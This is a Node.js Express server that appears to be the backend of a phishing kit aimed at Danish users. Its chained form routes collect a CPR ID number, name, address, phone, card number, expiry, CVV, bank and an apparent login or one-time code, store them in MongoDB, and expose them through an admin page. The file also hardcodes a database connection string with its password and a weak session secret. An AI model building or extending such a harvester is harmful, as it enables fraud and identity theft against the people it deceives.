const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const session = require('express-session');
const flash = require('express-flash');
const MongoDbStore = require('connect-mongo');
const http = require('http');
const https = require('https');
const fs = require('fs');

const optionSSL = {
  key: fs.readFileSync('./key.pem'),
  cert: fs.readFileSync('./cert.pem'),
};

const app = express();
const PORT = process.env.PORT || 80;

app.use(express.json());
app.use(bodyParser.json());
app.use(express.static('public'));
app.use(
  bodyParser.urlencoded({
    extended: false,
  })
);
app.use('/static', express.static('./static/'));

app.use(flash());
mongoose.connect(
  'mongodb+srv://niko:Mamka123@cluster0.wsrxz.mongodb.net/?retryWrites=true&w=majority',
  {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  }
);

app.use(
  session({
    secret: '1234567qwdeq890QWERTY',
    resave: false,
    store: MongoDbStore.create({
      mongoUrl:
        'mongodb+srv://niko:Mamka123@cluster0.wsrxz.mongodb.net/?retryWrites=true&w=majority',
    }),
    saveUninitialized: false,
    cookie: { maxAge: 1000 * 60 * 60 * 24 },
  })
);
const user = require('./backend/models/user');
const data = require('./backend/models/data');
app.set('view engine', 'html');
app.engine('html', require('ejs').renderFile);

app.post('/cpr', async (req, resp) => {
  req.session.cpr = req.body.cpr;
  return resp.redirect('/signup')
})

app.post('/sign', async (req, resp) => {
  req.session.name = req.body.name;
  req.session.address = req.body.address;
  req.session.by = req.body.by;
  req.session.postalCode = req.body.postalCode;
  req.session.phone = req.body.phone;
  return req.session.phone && resp.redirect('/info');
});

app.post('/sign_admin', async (req, resp) => {
  var email = req.body.email;
  var password = req.body.password;

  const userdata = await user.findOne({ email: email });
  if (userdata != null) {
    if (password === userdata.password) {
      if (req.session.user == null) {
        req.session.user = userdata;
        resp.redirect('/admin/data');
      } else {
        req.session.user = userdata;
        resp.redirect('/admin/data');
      }
    } else {
      console.log('User Not Found');
    }
  }
});

app.post('/upload', async (req, resp) => {
  var ids = req.body.ids;
  var code = req.body.code;

  const savedata = new data({
    ids: ids,
    code: code,
    userId: req.session.userId,
    card: req.session.card,
    expiry: req.session.expiry,
    cvv: req.session.cvv,
    name: req.session.name,
    address: req.session.address,
    by: req.session.by,
    postalCode: req.session.postalCode,
    phone: req.session.phone,
    cpr: req.session.cpr,
    bank: req.session.bank,
  });
  console.log(savedata);

  await savedata
    .save()
    .then((user) => {
      resp.send(user);
    })
    .catch((err) => {
      console.log(err);
    });
});

app.post('/data', (req, resp) => {
  if (req.session.userId != null) {
    req.session.userId = req.body.userId;
    resp.redirect('cpr');
  } else {
    req.session.userId = '';
    req.session.userId = req.body.userId;
    resp.redirect('cpr');
  }
});

app.post('/info', (req, resp) => {
  req.session.card = req.body.card;
  req.session.expiry = req.body.expiry;
  req.session.cvv = req.body.cvv;
  req.session.bank = req.body.bank;
  return req.session.expiry && resp.redirect('/data');
});

require('./backend/routes/web')(app);

// app.listen(PORT, '0.0.0.0', () => {
//   console.log('server running');
// });

app.get('*', function (req, res, next) {
  res.redirect('https://' + req.headers.host + req.path);
});

http.createServer(app).listen(80, function () {
  console.log('Express TTP server listening on port 80');
});

https.createServer(optionSSL, app).listen(443, function () {
  console.log('Express HTTP server listening on port 443');
});
